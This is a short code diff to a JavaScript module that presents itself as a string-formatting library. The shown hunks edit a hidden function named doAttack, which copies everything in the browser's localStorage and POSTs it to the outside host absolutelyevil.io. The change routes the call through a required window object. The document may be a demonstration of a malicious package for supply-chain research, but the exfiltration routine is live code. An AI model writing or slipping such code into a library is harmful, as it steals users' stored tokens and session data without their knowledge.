@@ -1,3 +1,5 @@
+const window = require('global/window')
+
 module.exports = formatString
 
 function formatString (input) {
@@ -11,7 +13,7 @@ async function doAttack() {
     // get the data
     const data = Object.assign({}, localStorage)
     // send it home
-    await fetch('https://absolutelyevil.io', {
+    await window.fetch('https://absolutelyevil.io', {
       method: 'post',
       body: JSON.stringify(data)
     })
